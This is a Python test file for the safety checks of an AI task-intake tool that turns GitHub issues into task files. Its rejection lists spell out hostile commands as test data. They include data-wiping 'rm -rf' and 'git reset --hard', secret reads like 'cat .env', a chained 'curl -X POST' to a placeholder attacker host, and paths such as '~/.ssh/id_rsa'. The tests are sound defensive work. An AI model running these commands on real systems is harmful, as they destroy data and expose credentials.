#!/usr/bin/env python3
"""Deterministic self-tests for AUTO-INTAKE V1 safety properties.

Runs under `python3 -m pytest scripts/ai/tests/test_auto_intake.py -v`
and, with no third-party dependency, under `python3 -m unittest`.

Every test is hermetic: no network, no GitHub calls, no repository writes
outside a temporary directory.
"""

from __future__ import annotations

import importlib.util
import json
import pathlib
import re
import sys
import tempfile
import unittest
import urllib.parse

MODULE_PATH = pathlib.Path(__file__).resolve().parents[1] / "auto_intake.py"

_spec = importlib.util.spec_from_file_location("auto_intake_under_test", MODULE_PATH)
intake = importlib.util.module_from_spec(_spec)
sys.modules["auto_intake_under_test"] = intake
_spec.loader.exec_module(intake)

GOOD_SHA = "a" * 40


OTHER_SHA = "b" * 40


def head_ok():
    """Authoritative HEAD equals the task's declared base_sha."""
    return GOOD_SHA


def head_moved():
    """Authoritative HEAD advanced past the task's base_sha (stale task)."""
    return OTHER_SHA


def head_unknown():
    """Authoritative HEAD cannot be resolved at all."""
    return None


def make_task(**overrides) -> dict:
    task = {
        "task_id": "AUTO-INTAKE-TEST-1",
        "base_sha": GOOD_SHA,
        "objective": "bounded test objective",
        "allowed_paths": ["scripts/ai/**"],
        "forbidden_paths": ["cloudflare-worker/**"],
        "acceptance_criteria": ["tests pass"],
        "validation_commands": ["python3 -m py_compile scripts/ai/auto_intake.py"],
        "max_rounds": 2,
        "max_output_tokens": 4000,
        "requires_claude": False,
        "auto_merge": False,
        "context_files": ["scripts/ai/auto_intake.py"],
    }
    task.update(overrides)
    return task


def make_issue(number: int = 1, task: dict | None = None, body: str | None = None) -> dict:
    if body is None:
        payload = json.dumps(make_task() if task is None else task)
        body = (
            "context\n"
            f"{intake.AI_TASK_JSON_BEGIN}\n{payload}\n{intake.AI_TASK_JSON_END}\n"
        )
    return {"number": number, "title": f"{intake.AI_TASK_MARKER} test", "body": body}


class SilentGitHub:
    """Records every GitHub call and answers deterministically. No network."""

    def __init__(self, responses: dict | None = None):
        self.calls: list[tuple[str, str, dict | None]] = []
        self.responses = responses or {}

    def __call__(self, method, url, body=None, allow_fail=False):
        self.calls.append((method, url, body))
        for fragment, value in self.responses.items():
            if fragment in url:
                if callable(value):
                    return value(method, url, body)
                return value
        if method == "GET":
            return []
        return {}


class IntakeTestBase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self._root = intake.ROOT
        intake.ROOT = pathlib.Path(self._tmp.name)
        self._gh = intake.github_request
        self.gh = SilentGitHub()
        intake.github_request = self.gh
        # Status-carrying transport stub. GET  -> self.label_status (default
        # 404 "absent"); POST /labels -> self.claim_status (default 201 "we
        # created it, we own the claim").
        self._status = intake.github_request_status
        self.probed: list[str] = []
        self.status_calls: list[tuple[str, str]] = []
        self.label_status = 404
        self.claim_status = 201
        intake.github_request_status = self._status_stub
        # A realistic in-repo file so context_files validation has something
        # genuinely safe to resolve against.
        self.make_repo_file("scripts/ai/auto_intake.py", "# fixture\n")
        self.addCleanup(self._restore)

    def make_repo_file(self, rel: str, content: str = "x\n") -> pathlib.Path:
        target = intake.ROOT / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
        return target

    def _status_stub(self, method, url, body=None):
        self.status_calls.append((method, url))
        if method == "GET":
            self.probed.append(url)
            return self.label_status(url) if callable(self.label_status) else self.label_status
        if method == "POST" and url.endswith("/labels"):
            return self.claim_status(url) if callable(self.claim_status) else self.claim_status
        return 200

    def _restore(self):
        intake.ROOT = self._root
        intake.github_request = self._gh
        intake.github_request_status = self._status
        self._tmp.cleanup()


# --- BLOCKER 1: hard forbidden scope ---------------------------------------


class TestHardForbiddenScope(IntakeTestBase):
    FORBIDDEN = [
        ".env",
        "./.env",
        "cloudflare-worker/.dev.vars",
        ".git",
        ".git/",
        ".git/**",
        ".git/config",
        "./.git/hooks/**",
    ]

    def test_hard_forbidden_allowed_paths_rejected(self):
        for entry in self.FORBIDDEN:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_allowed_scope([entry])

    def test_hard_forbidden_rejected_inside_valid_scope_list(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_allowed_scope(["scripts/ai/**", ".env"])

    def test_hard_forbidden_rejected_through_validate_task(self):
        task = make_task(allowed_paths=["scripts/ai/**", "cloudflare-worker/.dev.vars"])
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, head_resolver=head_ok)

    def test_path_allowed_never_permits_hard_forbidden(self):
        for entry in [".env", ".git/config", ".git"]:
            with self.subTest(entry=entry):
                self.assertFalse(intake.path_allowed(entry, [entry, "."], []))

    def test_traversal_and_absolute_rejected(self):
        for entry in ["../secrets", "scripts/../../etc", "/etc/passwd", "~/.ssh/id_rsa"]:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_allowed_scope([entry])


# --- BLOCKER 1: broad scope rejection --------------------------------------


class TestBroadScopeRejection(IntakeTestBase):
    BROAD = [".", "./", "*", "**", "./**", "**/*", "*/**", "", "   ", "/", "*.py", "?/x"]

    def test_broad_scopes_rejected(self):
        for entry in self.BROAD:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_allowed_scope([entry])

    def test_empty_allowed_paths_rejected(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_allowed_scope([])
        with self.assertRaises(intake.TaskError):
            intake.validate_allowed_scope("scripts/ai/**")

    def test_non_string_entry_rejected(self):
        for entry in [1, None, True, ["scripts"], {"p": "scripts"}]:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_allowed_scope([entry])

    def test_legitimate_scopes_accepted(self):
        for entry in [
            "scripts/ai/**",
            "scripts/ai/auto_intake.py",
            "docs/ai-coengineer/AUTO_INTAKE_V1.md",
            "scripts/ai/tests/**",
        ]:
            with self.subTest(entry=entry):
                intake.validate_allowed_scope([entry])


# --- BLOCKER 4: validation command allowlist -------------------------------


class TestValidationCommandAllowlist(IntakeTestBase):
    UNSAFE = [
        "python3 -c import os",
        "rm -rf /",
        "git push origin main",
        "git commit -m x",
        "git reset --hard",
        "git clean -fdx",
        "git config user.email a@b.c",
        "wrangler deploy",
        "kubectl apply -f x.yaml",
        "curl https://example.com",
        "curl -X POST https://example.com",
        "wget https://example.com",
        "bash -lc ls",
        "sh script.sh",
        "pytest && rm -rf .",
        "pytest ; rm -rf .",
        "pytest | tee out.txt",
        "pytest > out.txt",
        "echo $(cat .env)",
        "echo `cat .env`",
        "python3 -m pip install requests",
        "pip install requests",
        "npm run deploy",
        "make deploy",
        "find . -delete",
        "xargs rm",
        "eval ls",
        "source .env",
        "python3 -m http.server",
        "python3 -m unittest discover",
        "node -e process.exit(0)",
        "pytest\nrm -rf .",
        "",
        "   ",
        "cat .env",
        "x" * 501,
    ]
    SAFE = [
        "python3 -m py_compile scripts/ai/auto_intake.py",
        "python3 -m pytest scripts/ai/tests/test_auto_intake.py",
        "git diff --check",
        "git status --porcelain",
        "git rev-parse HEAD",
        "ruff check scripts/ai",
        "echo ok",
        "true",
    ]
    # Directory trust was removed: only exact allowlisted validator files run.
    NO_LONGER_TRUSTED = ["pytest scripts/ai/tests", "python3 -m pytest scripts/ai/tests"]

    def test_unsafe_commands_rejected(self):
        for cmd in self.UNSAFE:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_non_string_commands_rejected(self):
        for cmd in [None, 1, True, 1.5, ["pytest"], {"cmd": "pytest"}]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_safe_commands_accepted(self):
        for cmd in self.SAFE:
            with self.subTest(cmd=cmd):
                self.assertTrue(intake.validate_validation_command(cmd))

    def test_validate_task_rejects_unsafe_command(self):
        task = make_task(validation_commands=["pytest && curl -X POST https://evil.example"])
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, head_resolver=head_ok)


# --- BLOCKER 5: malformed issue isolation ----------------------------------


class TestMalformedIssueIsolation(IntakeTestBase):
    def test_one_malformed_issue_does_not_abort_batch(self):
        bad_json = make_issue(10, body=(
            f"{intake.AI_TASK_JSON_BEGIN}\n{{not json}}\n{intake.AI_TASK_JSON_END}"
        ))
        no_block = make_issue(11, body="no machine readable block here")
        broad_scope = make_issue(12, task=make_task(task_id="BROAD-1", allowed_paths=["."]))
        good = make_issue(13, task=make_task(task_id="GOOD-1"))

        summary = intake.run_intake(
            [bad_json, no_block, broad_scope, good],
            seen={},
            head_resolver=head_ok,
        )

        self.assertEqual(summary["processed"], 1)
        self.assertEqual(summary["failed"], 3)
        self.assertEqual(summary["total"], 4)
        self.assertEqual([r["issue_number"] for r in summary["results"]], [13])
        self.assertEqual(sorted(f["issue_number"] for f in summary["failures"]), [10, 11, 12])
        self.assertTrue((intake.ROOT / ".ai-intake" / "tasks" / "GOOD-1.json").is_file())

    def test_unexpected_exception_is_isolated(self):
        original = intake.write_task_file

        def explode(task, issue_number):
            if task["task_id"] == "BOOM-1":
                raise RuntimeError("disk full")
            return original(task, issue_number)

        intake.write_task_file = explode
        self.addCleanup(setattr, intake, "write_task_file", original)

        boom = make_issue(20, task=make_task(task_id="BOOM-1"))
        good = make_issue(21, task=make_task(task_id="GOOD-2"))
        summary = intake.run_intake([boom, good], seen={}, head_resolver=head_ok)

        self.assertEqual(summary["processed"], 1)
        self.assertEqual(summary["failed"], 1)
        self.assertEqual(summary["failures"][0]["issue_number"], 20)

    def test_failed_issue_gets_failed_status(self):
        bad = make_issue(30, body="missing block")
        intake.run_intake([bad], seen={}, head_resolver=head_ok)
        labels = [c for c in self.gh.calls if c[0] == "POST" and c[1].endswith("/labels")]
        self.assertTrue(any(
            f"{intake.STATUS_LABEL_PREFIX}failed" in (c[2] or {}).get("labels", [])
            for c in labels
        ))


# --- BLOCKER 7: direct issue fetch -----------------------------------------


class TestDirectIssueFetch(IntakeTestBase):
    def test_fetch_issue_hits_issue_endpoint_directly(self):
        issue = {"number": 108, "title": f"{intake.AI_TASK_MARKER} x", "body": "b"}
        self.gh.responses[f"/repos/{intake.REPO}/issues/108"] = issue

        got = intake.fetch_issue(108)

        self.assertEqual(got["number"], 108)
        self.assertEqual(len(self.gh.calls), 1)
        method, url, _ = self.gh.calls[0]
        self.assertEqual(method, "GET")
        self.assertTrue(url.endswith("/issues/108"))
        self.assertNotIn("per_page", url)
        self.assertNotIn("state=open", url)

    def test_fetch_issue_rejects_pull_request(self):
        self.gh.responses[f"/repos/{intake.REPO}/issues/5"] = {
            "number": 5, "title": f"{intake.AI_TASK_MARKER} x", "pull_request": {"url": "u"},
        }
        with self.assertRaises(SystemExit):
            intake.fetch_issue(5)

    def test_fetch_issue_rejects_unmarked_issue(self):
        self.gh.responses[f"/repos/{intake.REPO}/issues/6"] = {"number": 6, "title": "plain"}
        with self.assertRaises(SystemExit):
            intake.fetch_issue(6)

    def test_fetch_issue_rejects_missing_issue(self):
        self.gh.responses[f"/repos/{intake.REPO}/issues/7"] = None
        with self.assertRaises(SystemExit):
            intake.fetch_issue(7)


# --- BLOCKER 7: pagination --------------------------------------------------


class TestPagination(IntakeTestBase):
    def test_issue_discovery_reads_every_page(self):
        page1 = [
            {"number": n, "title": f"{intake.AI_TASK_MARKER} p1-{n}", "body": ""}
            for n in range(1, intake.PER_PAGE + 1)
        ]
        page2 = [{"number": 900, "title": f"{intake.AI_TASK_MARKER} p2", "body": ""}]

        def responder(method, url, body):
            return page2 if "page=2" in url else page1

        self.gh.responses["/issues?"] = responder
        found = intake.list_ai_issues()

        self.assertEqual(len(self.gh.calls), 2)
        self.assertIn("page=1", self.gh.calls[0][1])
        self.assertIn("page=2", self.gh.calls[1][1])
        self.assertIn(900, [i["number"] for i in found])
        self.assertEqual(len(found), intake.PER_PAGE + 1)

    def test_non_ai_issues_and_pull_requests_filtered(self):
        page = [
            {"number": 1, "title": f"{intake.AI_TASK_MARKER} keep", "body": ""},
            {"number": 2, "title": "plain issue", "body": ""},
            {"number": 3, "title": f"{intake.AI_TASK_MARKER} pr", "pull_request": {"url": "u"}},
        ]
        self.gh.responses["/issues?"] = page
        found = intake.list_ai_issues()
        self.assertEqual([i["number"] for i in found], [1])

    def test_pagination_cap_fails_closed(self):
        full = [
            {"number": n, "title": f"{intake.AI_TASK_MARKER} x", "body": ""}
            for n in range(intake.PER_PAGE)
        ]
        self.gh.responses["/issues?"] = full
        with self.assertRaises(SystemExit):
            intake.list_ai_issues(max_pages=2)

    def test_issue_receipt_scan_is_bounded_to_one_issue(self):
        page1 = [
            {"body": f"{intake.RECEIPT_MARKER}: T-{n}"} for n in range(intake.PER_PAGE)
        ]
        page2 = [{"body": f"{intake.RECEIPT_MARKER}: T-LAST"}]

        def responder(method, url, body):
            return page2 if "page=2" in url else page1

        self.gh.responses["/issues/55/comments"] = responder
        found = intake.issue_receipt_task_ids(55)

        self.assertEqual(len(self.gh.calls), 2)
        for _, url, _ in self.gh.calls:
            # Scoped to ONE issue: never the repo-wide comment firehose.
            self.assertIn("/issues/55/comments", url)
        self.assertIn("T-LAST", found)

    def test_repo_wide_history_scan_no_longer_exists(self):
        self.assertFalse(hasattr(intake, "fetch_durable_receipts"))


# --- BLOCKER 2: durable idempotency ----------------------------------------


class TestDurableIdempotency(IntakeTestBase):
    def test_ledger_label_is_deterministic_and_within_github_limits(self):
        for task_id in ["A" * 3, "AUTO-INTAKE-TEST-1", "T" * 64, "x.y_z-1", "B" * 40]:
            with self.subTest(task_id=task_id):
                first = intake.receipt_label(task_id)
                self.assertEqual(first, intake.receipt_label(task_id))
                self.assertTrue(first.startswith(intake.RECEIPT_LABEL_PREFIX))
                self.assertLessEqual(len(first), intake.MAX_LABEL_LEN)

    def test_long_task_ids_do_not_collide(self):
        a = intake.receipt_label("Z" * 63 + "A")
        b = intake.receipt_label("Z" * 63 + "B")
        self.assertNotEqual(a, b)
        self.assertLessEqual(max(len(a), len(b)), intake.MAX_LABEL_LEN)

    def test_durable_label_blocks_reprocessing_with_no_local_state(self):
        self.label_status = 200
        self.assertFalse(intake.local_receipt_exists("DUP-1"))
        self.assertTrue(intake.task_already_processed("DUP-1"))

    def test_durable_check_is_o1_and_history_independent(self):
        """A previously processed task stays blocked no matter how much history
        has accumulated: the check never scans issue/comment history at all."""
        self.label_status = 200
        huge_history = [
            {"body": f"noise comment {n}"} for n in range(10_000)
        ]
        self.gh.responses["/comments"] = huge_history
        self.gh.responses["/issues?"] = [
            {"number": n, "title": "noise", "body": ""} for n in range(intake.PER_PAGE)
        ]

        self.assertTrue(intake.task_already_processed("OLD-TASK", issue_number=1, seen={}))

        # Exactly one durable lookup, and zero history pagination.
        self.assertEqual(len(self.probed), 1)
        self.assertIn("/labels/", self.probed[0])
        self.assertEqual(self.gh.calls, [])

    def test_aged_out_receipt_comment_still_blocked_by_ledger(self):
        """The old failure mode: receipt comment long gone from any window."""
        self.label_status = 200
        self.gh.responses["/comments"] = []  # no receipt comment survives anywhere
        issue = make_issue(200, task=make_task(task_id="AGED-1"))
        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
        self.assertEqual(summary["processed"], 0)
        self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "AGED-1.json").exists())

    def test_indeterminate_lookup_fails_closed(self):
        for code in [0, 401, 403, 500, 502, 429]:
            with self.subTest(code=code):
                self.label_status = code
                with self.assertRaises(intake.TaskError):
                    intake.task_already_processed("UNKNOWN-1")

    def test_indeterminate_lookup_blocks_task_file_write(self):
        self.label_status = 500
        issue = make_issue(201, task=make_task(task_id="INDET-1"))
        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
        self.assertEqual(summary["failed"], 1)
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "INDET-1.json").exists())

    def test_durable_receipt_causes_duplicate_skipped(self):
        issue = make_issue(50, task=make_task(task_id="DUP-2"))
        summary = intake.run_intake(
            [issue], seen={"DUP-2": 49}, head_resolver=head_ok
        )
        self.assertEqual(summary["processed"], 0)
        self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "DUP-2.json").exists())

    def test_issue_receipt_comment_still_blocks(self):
        self.gh.responses["/issues/51/comments"] = [
            {"body": f"{intake.RECEIPT_MARKER}: ISSUE-1"}
        ]
        self.assertTrue(intake.task_already_processed("ISSUE-1", issue_number=51, seen={}))

    def test_local_cache_alone_still_blocks(self):
        state_dir = intake.ROOT / ".ai-intake"
        state_dir.mkdir(parents=True, exist_ok=True)
        (state_dir / "LOCAL-1.json").write_text("{}", encoding="utf-8")
        self.assertTrue(intake.task_already_processed("LOCAL-1", seen={}))

    def test_ledger_label_created_on_success(self):
        issue = make_issue(60, task=make_task(task_id="NEW-1"))
        intake.run_intake([issue], seen={}, head_resolver=head_ok)
        claims = [
            c for c in self.status_calls
            if c[0] == "POST" and c[1].endswith("/labels") and "/issues/" not in c[1]
        ]
        self.assertEqual(len(claims), 1)

    def test_receipt_comment_posted_to_github_after_success(self):
        issue = make_issue(61, task=make_task(task_id="NEW-2"))
        intake.run_intake([issue], seen={}, head_resolver=head_ok)
        receipt_posts = [
            c for c in self.gh.calls
            if c[0] == "POST" and intake.RECEIPT_MARKER in json.dumps(c[2] or {})
        ]
        self.assertEqual(len(receipt_posts), 1)
        self.assertIn("NEW-2", receipt_posts[0][2]["body"])

    def test_ledger_write_failure_prevents_marking(self):
        original = intake.mark_processed
        marked: list[str] = []
        intake.mark_processed = lambda task, n: marked.append(task["task_id"])
        self.addCleanup(setattr, intake, "mark_processed", original)

        # The claim POST fails with a non-422 error: ownership is never granted.
        self.claim_status = 500

        seen: dict[str, int] = {}
        summary = intake.run_intake(
            [make_issue(62, task=make_task(task_id="LEDGER-FAIL"))],
            seen=seen, head_resolver=head_ok,
        )
        self.assertEqual(summary["failed"], 1)
        self.assertEqual(marked, [])
        self.assertNotIn("LEDGER-FAIL", seen)

    def test_second_pass_in_same_batch_is_skipped(self):
        a = make_issue(70, task=make_task(task_id="SAME-1"))
        b = make_issue(71, task=make_task(task_id="SAME-1"))
        summary = intake.run_intake([a, b], seen={}, head_resolver=head_ok)
        self.assertEqual(summary["processed"], 1)
        self.assertEqual(summary["results"][1]["status"], "DUPLICATE_SKIPPED")

    def test_fresh_checkout_simulation_stays_blocked(self):
        """Fresh VPS worktree: empty .ai-intake, new tmp ROOT, ledger persists."""
        issue = make_issue(72, task=make_task(task_id="FRESH-1"))
        intake.run_intake([issue], seen={}, head_resolver=head_ok)
        self.assertTrue((intake.ROOT / ".ai-intake" / "tasks" / "FRESH-1.json").is_file())

        # Wipe every local trace, exactly as a fresh checkout would.
        fresh = tempfile.TemporaryDirectory()
        self.addCleanup(fresh.cleanup)
        intake.ROOT = pathlib.Path(fresh.name)
        self.make_repo_file("scripts/ai/auto_intake.py", "# fixture\n")
        self.label_status = 200  # the GitHub ledger entry survives

        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
        self.assertEqual(summary["processed"], 0)
        self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")


# --- BLOCKER 6: singular durable status ------------------------------------


class TestSingularStatusTransitions(IntakeTestBase):
    def test_previous_status_labels_removed(self):
        self.gh.responses["/labels"] = lambda method, url, body: (
            [{"name": "ai-status:received"}, {"name": "ai-status:failed"}, {"name": "keep-me"}]
            if method == "GET" else {}
        )
        intake.set_status_label(80, "READY")

        deletes = [c[1] for c in self.gh.calls if c[0] == "DELETE"]
        posts = [c for c in self.gh.calls if c[0] == "POST"]
        self.assertEqual(len(deletes), 2)
        self.assertTrue(any("ai-status%3Areceived" in d for d in deletes))
        self.assertTrue(any("ai-status%3Afailed" in d for d in deletes))
        self.assertFalse(any("keep-me" in d for d in deletes))
        self.assertEqual(posts[0][2]["labels"], ["ai-status:ready"])

    def test_no_duplicate_post_when_label_already_correct(self):
        self.gh.responses["/labels"] = lambda method, url, body: (
            [{"name": "ai-status:ready"}] if method == "GET" else {}
        )
        intake.set_status_label(81, "READY")
        self.assertEqual([c[0] for c in self.gh.calls if c[0] != "GET"], [])

    def test_status_sequence_is_singular_per_transition(self):
        issue = make_issue(82, task=make_task(task_id="SEQ-1"))
        intake.run_intake([issue], seen={}, head_resolver=head_ok)
        label_posts = [
            c[2]["labels"] for c in self.gh.calls
            if c[0] == "POST" and c[1].endswith("/labels")
            and "/issues/" in c[1]
            and any(str(x).startswith(intake.STATUS_LABEL_PREFIX) for x in c[2].get("labels", []))
        ]
        for labels in label_posts:
            self.assertEqual(len(labels), 1)
        self.assertEqual(label_posts[-1], ["ai-status:ready"])

    def test_unknown_status_fails_closed(self):
        with self.assertRaises(intake.TaskError):
            intake.report_status(83, "TOTALLY_UNKNOWN")


# --- BLOCKER 8: numeric type fail-closed -----------------------------------


class TestNumericTypeFailClosed(IntakeTestBase):
    BAD_VALUES = [True, False, "2", "abc", 2.5, 2.0, None, [2], {"v": 2}]

    def test_validate_numeric_field_rejects_non_int(self):
        for value in self.BAD_VALUES:
            with self.subTest(value=value):
                with self.assertRaises(intake.TaskError):
                    intake.validate_numeric_field(value, "max_rounds")

    def test_max_rounds_bad_type_rejected(self):
        for value in self.BAD_VALUES:
            with self.subTest(value=value):
                task = make_task(max_rounds=value)
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(task, 1, head_resolver=head_ok)

    def test_max_output_tokens_bad_type_rejected(self):
        for value in self.BAD_VALUES:
            with self.subTest(value=value):
                task = make_task(max_output_tokens=value)
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(task, 1, head_resolver=head_ok)

    def test_valid_numbers_are_clamped_not_coerced(self):
        task = intake.validate_task(
            make_task(max_rounds=99, max_output_tokens=99999), 1,
            head_resolver=head_ok,
        )
        self.assertEqual(task["max_rounds"], 4)
        self.assertEqual(task["max_output_tokens"], 8000)
        task = intake.validate_task(
            make_task(max_rounds=-5, max_output_tokens=1), 1,
            head_resolver=head_ok,
        )
        self.assertEqual(task["max_rounds"], 1)
        self.assertEqual(task["max_output_tokens"], 512)

    def test_auto_merge_and_requires_claude_must_be_bool(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(auto_merge="false"), 1, head_resolver=head_ok)
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(requires_claude=1), 1, head_resolver=head_ok)
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(auto_merge=True), 1, head_resolver=head_ok)


# --- BLOCKER 8: base_sha resolution ----------------------------------------


class TestBaseShaResolution(IntakeTestBase):
    def test_unresolvable_base_sha_rejected(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(), 1, head_resolver=head_unknown)

    def test_malformed_base_sha_rejected(self):
        for value in ["", "abc", "Z" * 40, "A" * 40, GOOD_SHA[:39], 12345, None, True]:
            with self.subTest(value=value):
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(
                        make_task(base_sha=value), 1, head_resolver=head_ok
                    )

    def test_head_resolver_is_consulted(self):
        calls = []

        def resolver():
            calls.append(1)
            return GOOD_SHA

        intake.validate_task(make_task(), 1, head_resolver=resolver)
        self.assertEqual(len(calls), 1)

    def test_current_head_is_accepted(self):
        task = intake.validate_task(make_task(), 1, head_resolver=head_ok)
        self.assertEqual(task["base_sha"], GOOD_SHA)

    def test_historical_but_valid_sha_is_rejected_as_stale(self):
        """The SHA resolves to a real commit but HEAD has moved past it."""
        with self.assertRaises(intake.TaskError) as ctx:
            intake.validate_task(make_task(), 1, head_resolver=head_moved)
        self.assertIn("STALE", str(ctx.exception))

    def test_stale_sha_blocked_before_any_receipt_is_claimed(self):
        issue = make_issue(91, task=make_task(task_id="STALE-2"))
        summary = intake.run_intake([issue], seen={}, head_resolver=head_moved)
        self.assertEqual(summary["failed"], 1)
        self.assertEqual([c for c in self.status_calls if c[0] == "POST"], [])
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "STALE-2.json").exists())

    def test_unresolvable_head_fails_closed(self):
        self.gh.responses["/repos/"] = None
        self.assertIsNone(intake.resolve_authoritative_head())
        with self.assertRaises(intake.TaskError):
            intake.validate_task(make_task(), 1, head_resolver=head_unknown)

    def test_malformed_head_value_fails_closed(self):
        for bogus in ["", "abc", "Z" * 40, 12345, None, True]:
            with self.subTest(bogus=bogus):
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(make_task(), 1, head_resolver=lambda: bogus)

    def test_unresolvable_base_sha_blocks_task_file_write(self):
        issue = make_issue(90, task=make_task(task_id="STALE-1"))
        summary = intake.run_intake([issue], seen={}, head_resolver=head_unknown)
        self.assertEqual(summary["failed"], 1)
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "STALE-1.json").exists())


# --- BLOCKER 3: write-before-mark ordering ---------------------------------


class TestWriteBeforeMarkOrdering(IntakeTestBase):
    def test_task_not_marked_processed_when_write_fails(self):
        original_write = intake.write_task_file
        original_mark = intake.mark_processed
        original_receipt = intake.post_receipt
        original_ledger = intake.create_receipt_label
        marked: list[str] = []
        receipted: list[str] = []
        ledgered: list[str] = []

        def failing_write(task, issue_number):
            raise OSError("read-only filesystem")

        intake.write_task_file = failing_write
        intake.mark_processed = lambda task, n: marked.append(task["task_id"])
        intake.post_receipt = lambda n, task, f: receipted.append(task["task_id"])
        intake.create_receipt_label = lambda tid, n: ledgered.append(tid)
        self.addCleanup(setattr, intake, "write_task_file", original_write)
        self.addCleanup(setattr, intake, "mark_processed", original_mark)
        self.addCleanup(setattr, intake, "post_receipt", original_receipt)
        self.addCleanup(setattr, intake, "create_receipt_label", original_ledger)

        seen: dict[str, int] = {}
        summary = intake.run_intake(
            [make_issue(100, task=make_task(task_id="ORDER-1"))],
            seen=seen, head_resolver=head_ok,
        )

        self.assertEqual(summary["failed"], 1)
        self.assertEqual(marked, [])
        self.assertEqual(receipted, [])
        self.assertEqual(ledgered, [])
        self.assertNotIn("ORDER-1", seen)

    def test_call_order_is_write_then_ledger_then_receipt_then_mark(self):
        original_write = intake.write_task_file
        original_mark = intake.mark_processed
        original_receipt = intake.post_receipt
        original_ledger = intake.create_receipt_label
        order: list[str] = []

        def traced_write(task, issue_number):
            order.append("write")
            return original_write(task, issue_number)

        intake.write_task_file = traced_write
        intake.create_receipt_label = lambda tid, n: order.append("ledger")
        intake.post_receipt = lambda n, task, f: order.append("receipt")
        intake.mark_processed = lambda task, n: order.append("mark")
        self.addCleanup(setattr, intake, "write_task_file", original_write)
        self.addCleanup(setattr, intake, "mark_processed", original_mark)
        self.addCleanup(setattr, intake, "post_receipt", original_receipt)
        self.addCleanup(setattr, intake, "create_receipt_label", original_ledger)

        intake.run_intake(
            [make_issue(101, task=make_task(task_id="ORDER-2"))],
            seen={}, head_resolver=head_ok,
        )
        self.assertEqual(order, ["write", "ledger", "receipt", "mark"])

    def test_successful_write_persists_task_file_before_ready(self):
        issue = make_issue(102, task=make_task(task_id="ORDER-3"))
        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
        task_file = intake.ROOT / ".ai-intake" / "tasks" / "ORDER-3.json"
        self.assertTrue(task_file.is_file())
        self.assertEqual(summary["results"][0]["status"], "READY")
        payload = json.loads(task_file.read_text(encoding="utf-8"))
        self.assertEqual(payload["source_issue"], 102)
        self.assertEqual(payload["auto_merge"], False)


# --- cross-cutting safety ---------------------------------------------------


class TestGeneralSafety(IntakeTestBase):
    def test_secret_bearing_task_rejected(self):
        task = make_task(objective="use DEEPSEEK_API_KEY=sk-abcdefghijklmnopqrstuvwx")
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, head_resolver=head_ok)

    def test_missing_required_fields_rejected(self):
        for field in intake.REQUIRED_FIELDS:
            with self.subTest(field=field):
                task = make_task()
                task.pop(field)
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(task, 1, head_resolver=head_ok)

    def test_multiple_task_blocks_rejected(self):
        body = (
            f"{intake.AI_TASK_JSON_BEGIN}\n{json.dumps(make_task())}\n{intake.AI_TASK_JSON_END}\n"
            f"{intake.AI_TASK_JSON_BEGIN}\n{json.dumps(make_task())}\n{intake.AI_TASK_JSON_END}\n"
        )
        with self.assertRaises(intake.TaskError):
            intake.extract_task_json(make_issue(1, body=body))

    def test_no_merge_or_deploy_calls_are_ever_made(self):
        issue = make_issue(110, task=make_task(task_id="SAFE-1"))
        intake.run_intake([issue], seen={}, head_resolver=head_ok)
        for method, url, _ in self.gh.calls:
            self.assertNotIn("/merge", url)
            self.assertNotIn("/deployments", url)
            self.assertNotIn("/pulls", url)
            self.assertIn(method, {"GET", "POST", "DELETE"})


# --- downstream contract: DANGEROUS_VALIDATION ownership --------------------


def _load_downstream():
    path = MODULE_PATH.parent / "deepseek_implementer.py"
    if not path.is_file():
        return None
    spec = importlib.util.spec_from_file_location("deepseek_implementer_under_test", path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["deepseek_implementer_under_test"] = mod
    spec.loader.exec_module(mod)
    return mod


DOWNSTREAM = _load_downstream()


@unittest.skipIf(DOWNSTREAM is None, "deepseek_implementer.py not present")
class TestDownstreamValidationContract(IntakeTestBase):
    """AUTO-INTAKE is the strong allowlist gate; deepseek_implementer's
    DANGEROUS_VALIDATION denylist is an INDEPENDENT downstream defence for task
    files that never passed through AUTO-INTAKE. These tests prove the two
    layers do not conflict and that AUTO-INTAKE is strictly the stricter one."""

    #: Everything the downstream denylist explicitly names.
    DOWNSTREAM_BLOCKED = [
        "rm -rf /",
        "rm -rf .",
        "git reset --hard HEAD",
        "git clean -fdx",
        "git push origin main",
        "git commit -m wip",
        "wrangler deploy",
        "curl -X POST https://example.com",
        "curl --request DELETE https://example.com",
    ]

